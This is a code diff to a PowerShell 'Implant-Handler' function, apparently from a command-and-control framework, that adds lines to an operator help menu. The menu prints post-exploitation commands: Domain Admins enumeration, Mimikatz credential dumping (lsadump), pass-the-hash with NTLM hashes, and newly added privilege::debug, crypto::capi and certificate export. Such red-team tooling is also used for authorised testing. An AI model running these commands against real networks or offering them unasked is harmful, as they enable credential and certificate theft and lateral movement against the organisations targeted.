@@ -179,6 +179,7 @@ function Implant-Handler
         write-host " Net View | Net Users | Whoami /groups | Net localgroup administrators | Net Accounts /dom" -ForegroundColor Green  
         write-host ' Get-NetUser -Filter "(userprincipalname=*@testdomain.com)" | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
         write-host ' Get-NetGroup -GroupName "Domain Admins" | %{ Get-NetUser $_.membername } | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname' -ForegroundColor Green 
+        write-host ' Get-DomainGroupMember -Recurse "Domain Admins" | Select MemberName' -ForegroundColor Green
         write-host " Get-NetDomain | Get-NetDomainController | Get-NetDomainTrust" -ForegroundColor Green 
         write-host " Get-NetForest | Get-NetForestTrust | Get-NetForestDomain " -ForegroundColor Green
         write-host ' Get-NetComputer | Select-String -pattern "Citrix" ' -ForegroundColor Green 
@@ -222,6 +223,9 @@ function Implant-Handler
         write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::lsa$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::cache$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)ts::multirdp$($speechmarks)$($tick)" -ForegroundColor Green
+        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)privilege::debug$($speechmarks)$($tick)" -ForegroundColor Green
+        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)crypto::capi$($speechmarks)$($tick)" -ForegroundColor Green
+        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)crypto::certificates /export$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-Mimikatz -Computer 10.0.0.1 -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-TokenManipulation | Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize | Out-String" -ForegroundColor Green
